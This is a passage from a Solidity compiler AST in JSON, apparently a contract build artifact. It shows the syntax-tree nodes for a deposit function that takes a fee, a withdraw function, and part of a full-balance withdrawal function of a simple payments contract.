																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2664:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 60,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 57,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "2688:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 58,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2688:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"id": 59,
															"name": "fee",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 45,
															"src": "2700:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "2688:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2664:39:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 62,
												"nodeType": "ExpressionStatement",
												"src": "2664:39:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 65,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 63,
														"name": "collectedFees",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "2770:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 64,
														"name": "fee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 45,
														"src": "2787:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2770:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 66,
												"nodeType": "ExpressionStatement",
												"src": "2770:20:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d0e30db0",
									"id": 68,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "deposit",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2505:2:0"
									},
									"returnParameters": {
										"id": 35,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2522:0:0"
									},
									"scope": 163,
									"src": "2489:309:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 114,
										"nodeType": "Block",
										"src": "2972:291:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 82,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 79,
																		"name": "_amount",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 70,
																		"src": "3017:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"baseExpression": {
																			"argumentTypes": null,
																			"id": 74,
																			"name": "accounts",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 15,
																			"src": "2992:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																				"typeString": "mapping(address => uint256)"
																			}
																		},
																		"id": 77,
																		"indexExpression": {
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 75,
																				"name": "msg",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": -15,
																				"src": "3001:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_message",
																					"typeString": "msg"
																				}
																			},
																			"id": 76,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "sender",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "3001:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		},
																		"isConstant": false,
																		"isLValue": true,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "IndexAccess",
																		"src": "2992:20:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 78,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sub",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 588,
																	"src": "2992:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																		"typeString": "function (uint256,uint256) pure returns (uint256)"
																	}
																},
																"id": 80,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "2992:33:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 81,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3029:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "2992:38:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "496e73756666696369656e742066756e6473",
															"id": 83,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3032:20:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_63452317cb6d597bef833f023ed2962a84dbd24c571e27629ed1e3056d6cfd8d",
																"typeString": "literal_string \"Insufficient funds\""
															},
															"value": "Insufficient funds"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_63452317cb6d597bef833f023ed2962a84dbd24c571e27629ed1e3056d6cfd8d",
																"typeString": "literal_string \"Insufficient funds\""
															}
														],
														"id": 73,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "2983:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 84,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2983:70:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 85,
												"nodeType": "ExpressionStatement",
												"src": "2983:70:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 97,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 86,
															"name": "accounts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 15,
															"src": "3089:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 89,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 87,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "3098:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 88,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3098:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "3089:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 95,
																"name": "_amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 70,
																"src": "3137:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 90,
																	"name": "accounts",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 15,
																	"src": "3112:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 93,
																"indexExpression": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 91,
																		"name": "msg",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -15,
																		"src": "3121:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_message",
																			"typeString": "msg"
																		}
																	},
																	"id": 92,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "sender",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "3121:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "3112:20:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 94,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 588,
															"src": "3112:24:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 96,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3112:33:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3089:56:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 98,
												"nodeType": "ExpressionStatement",
												"src": "3089:56:0"
											},
											{
												"assignments": [
													100,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 100,
														"name": "sent",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 114,
														"src": "3157:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 99,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "3157:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 108,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "",
															"id": 106,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3204:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 101,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "3172:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 102,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3172:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 103,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3172:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 105,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"argumentTypes": null,
																"id": 104,
																"name": "_amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 70,
																"src": "3195:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "3172:31:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 107,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3172:35:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3156:51:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 110,
															"name": "sent",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 100,
															"src": "3226:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4661696c656420746f2073656e642066756e6473",
															"id": 111,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3232:22:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6ccad9b42603510aa2281dc09de0f29ec7380180d77b1d766639429fee61ba0f",
																"typeString": "literal_string \"Failed to send funds\""
															},
															"value": "Failed to send funds"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6ccad9b42603510aa2281dc09de0f29ec7380180d77b1d766639429fee61ba0f",
																"typeString": "literal_string \"Failed to send funds\""
															}
														],
														"id": 109,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3218:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 112,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3218:37:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 113,
												"nodeType": "ExpressionStatement",
												"src": "3218:37:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "2e1a7d4d",
									"id": 115,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdraw",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 71,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 70,
												"name": "_amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 115,
												"src": "2951:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 69,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2951:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2950:14:0"
									},
									"returnParameters": {
										"id": 72,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2972:0:0"
									},
									"scope": 163,
									"src": "2933:330:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 154,
										"nodeType": "Block",
										"src": "3404:250:0",
										"statements": [
											{
												"assignments": [
													119
												],
												"declarations": [
													{
														"constant": false,
														"id": 119,
														"name": "amount",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 154,
														"src": "3415:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 118,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "3415:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 124,
												"initialValue": {
													"argumentTypes": null,
													"baseExpression": {
														"argumentTypes": null,
														"id": 120,
														"name": "accounts",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "3429:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
															"typeString": "mapping(address => uint256)"
														}
													},
													"id": 123,
													"indexExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 121,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": -15,
															"src": "3438:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 122,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "3438:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "IndexAccess",
													"src": "3429:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3415:34:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 128,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 126,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 119,
																"src": "3469:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 127,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3478:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3469:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "496e73756666696369656e742066756e6473",
															"id": 129,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3481:20:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_63452317cb6d597bef833f023ed2962a84dbd24c571e27629ed1e3056d6cfd8d",
																"typeString": "literal_string \"Insufficient funds\""
															},
															"value": "Insufficient funds"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_63452317cb6d597bef833f023ed2962a84dbd24c571e27629ed1e3056d6cfd8d",
																"typeString": "literal_string \"Insufficient funds\""
															}
														],
														"id": 125,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3460:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 130,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3460:42:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 131,
												"nodeType": "ExpressionStatement",
												"src": "3460:42:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 137,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 132,
															"name": "accounts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 15,
															"src": "3513:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 135,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 133,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -15,
																"src": "3522:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 134,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3522:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "3513:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 136,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3536:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "3513:24:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 138,
												"nodeType": "ExpressionStatement",
												"src": "3513:24:0"
											},
											{
												"assignments": [
													140,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 140,
														"name": "sent",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 154,
														"src": "3549:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 139,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "3549:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 148,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "",
															"id": 146,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3595:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 141,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": -15,
																	"src": "3564:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 142,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3564:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 143,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3564:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 145,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"argumentTypes": null,
																"id": 144,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 119,
																"src": "3587:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "3564:30:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 147,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3564:34:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3548:50:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 150,
															"name": "sent",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 140,
															"src": "3617:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
